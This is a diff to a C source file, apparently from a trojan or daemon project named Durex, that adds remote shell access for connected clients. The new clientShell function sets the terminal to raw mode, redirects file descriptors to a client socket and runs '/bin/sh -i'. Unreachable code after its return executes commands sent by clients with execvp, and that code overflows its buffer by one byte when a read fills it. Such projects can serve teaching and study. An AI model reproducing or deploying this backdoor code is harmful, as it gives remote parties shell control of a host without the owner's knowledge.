@@ -6,17 +6,25 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 03:49:03 by root              #+#    #+#             */
-/*   Updated: 2018/08/21 08:58:36 by root             ###   ########.fr       */
+/*   Updated: 2018/08/26 23:29:04 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
+#include <termios.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <sys/time.h>
+#include <sys/resource.h>
+
 #include "durex.h"
+
+extern char **environ;
 
 void			clearClient(t_cl *client)
 {
 	client->fd = -1;
-	client->shell[0] = -1;
-	client->shell[1] = -1;
 	mymemset(client->addr, 0, sizeof(client->addr));
 	mymemset(client->host, 0, sizeof(client->host));
 	mymemset(client->port, 0, sizeof(client->port));
@@ -36,9 +44,15 @@ void			clientRead(char *buff, int size, t_cl *client)
 	i = 0;
 	while (i < size) {
 		*client->rd.head = buff[i];
-		client->rd.head = moveTail(client->rd.head, client->rd.buff, SERVER_CLIENT_BUFF);
-		if (client->rd.head == client->rd.tail) {
-			client->rd.tail = moveTail(client->rd.tail, client->rd.buff, SERVER_CLIENT_BUFF);
+		if (*client->rd.head == '\n') {
+			serverCommands(client);
+			client->rd.head = moveTail(client->rd.head, client->rd.buff, SERVER_CLIENT_BUFF);
+			client->rd.tail = client->rd.head;
+		} else {
+			client->rd.head = moveTail(client->rd.head, client->rd.buff, SERVER_CLIENT_BUFF);
+			if (client->rd.head == client->rd.tail) {
+				client->rd.tail = moveTail(client->rd.tail, client->rd.buff, SERVER_CLIENT_BUFF);
+			}
 		}
 		i++;
 	}
@@ -50,8 +64,74 @@ void			clientWrite(char *str, t_cl *client)
 		*client->wr.head = *str;
 		client->wr.head = moveTail(client->wr.head, client->wr.buff, SERVER_CLIENT_BUFF);
 		if (client->wr.head == client->wr.tail) {
-			client->wr.tail = moveTail(client->wr.tail, client->wr.buff, SERVER_CLIENT_BUFF);
+			write(client->fd, client->wr.tail, client->wr.buff + SERVER_CLIENT_BUFF - client->wr.tail);
+			client->wr.tail = client->wr.buff;
 		}
 		str++;
 	}
+}
+
+void			clientShell(int fds, int cl_fd)
+{
+	struct termios	origin;
+	struct termios	exclusive;
+	struct rlimit	rlim;
+
+	tcgetattr(fds, &origin);
+	exclusive = origin;
+	cfmakeraw(&exclusive);
+	tcsetattr(fds, TCSANOW, &exclusive);
+	if (!getrlimit(RLIMIT_NOFILE, &rlim)) {
+		if (rlim.rlim_max == RLIM_INFINITY)
+			rlim.rlim_max = 4096;
+		for (size_t i = 0; i < rlim.rlim_max; i++) {
+			if (i != (size_t)fds && i != 4)
+				close(i);
+		}
+		dup(fds);
+		dup(fds);
+		dup(fds);
+		dup2(cl_fd, fds);
+	} else {
+		dup2(fds, STDIN_FILENO);
+		dup2(fds, STDOUT_FILENO);
+		dup2(fds, STDERR_FILENO);
+	}
+	close(fds);
+	close(cl_fd);
+	/* pid_t pid = setsid(); */
+	/* serverLog("CHILD pid:%d", pid); */
+	/* ioctl(0, TIOCSCTTY, 1); */
+	
+	{
+		char *cmd[] = { "/bin/sh", "-i", NULL };
+		execv(cmd[0], cmd);
+	}
+	serverLog("CHILD shell exited");
+	return ;
+
+	char			buff[SERVER_CLIENT_BUFF];
+	int				ret;
+	while ((ret = read(fds, buff, SERVER_CLIENT_BUFF)) > 0) {
+		buff[ret] = 0;
+		char	**split = mysplitwhitespaces(buff);
+		pid_t	pid = fork();
+		if (pid == 0) {
+			execvp(split[0], split);
+			exit(-1);
+		} else if (pid > 0) {
+			waitpid(pid, &ret, 0);
+			serverLog("[INFO] CHILD shell %d.", ret);
+			if (ret == -1)
+				break ;
+		} else {
+			break ;
+		}
+		char **ptr = split;
+		while (*ptr)
+			free(*ptr++);
+		free(split);
+	}
+	exit(0);
+
 }
